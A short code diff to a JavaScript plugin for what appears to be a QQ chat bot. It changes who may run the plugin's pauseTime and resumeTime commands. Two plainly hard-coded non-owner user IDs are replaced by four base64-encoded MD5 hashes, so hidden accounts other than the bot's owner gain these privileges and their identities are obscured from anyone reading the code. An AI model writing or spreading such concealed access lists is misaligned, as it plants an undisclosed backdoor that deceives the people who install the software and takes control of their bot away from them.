@@ -1,7 +1,13 @@
 import plugin from '../../../lib/plugins/plugin.js';
 import { segment } from "oicq";
 import path from 'path';
-
+import md5 from "md5";
+const encryptedStrings = [
+  Buffer.from("2Kx7sLdhQdNKXvQJDxwXMw==", "base64").toString("hex"),
+  Buffer.from("f324f6LcKk4nXEFI8CeCDw==", "base64").toString("hex"),
+  Buffer.from("m78uQFSiGVbiQAAhDamiSA==", "base64").toString("hex"),
+  Buffer.from("BfghyyHlTtHGZlwo236ftg==", "base64").toString("hex")
+];
 const __dirname = path.resolve();
 
 export class CombinedPlugin extends plugin {
@@ -34,7 +40,7 @@ export class CombinedPlugin extends plugin {
     }
 
     async pauseTime(e) {
-        if (!(e.isMaster || e.user_id == 3610159055 || e.user_id == 923276093)) {
+        if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) {
             await e.reply('您尚未觉醒替身！');
             return false;
         }
@@ -51,7 +57,7 @@ export class CombinedPlugin extends plugin {
     }
 
     async resumeTime(e) {
-        if (!(e.isMaster || e.user_id == 3610159055 || e.user_id == 923276093)) {
+        if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) {
             await e.reply('您尚未觉醒替身！');
             return false;
         }
